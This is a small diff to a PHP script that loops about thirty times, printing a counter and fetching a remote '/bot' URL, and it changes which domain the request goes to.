@@ -14,7 +14,7 @@ function task()
     global $index;
     $index++;
     echo $index.'<br>';
-   $str = file_get_contents('http://wordpress-themes.ir/bot');
+   $str = file_get_contents('https://kaktoos.ca/bot');
 }
 
 for ($i = 0; $i < 30; $i++) {
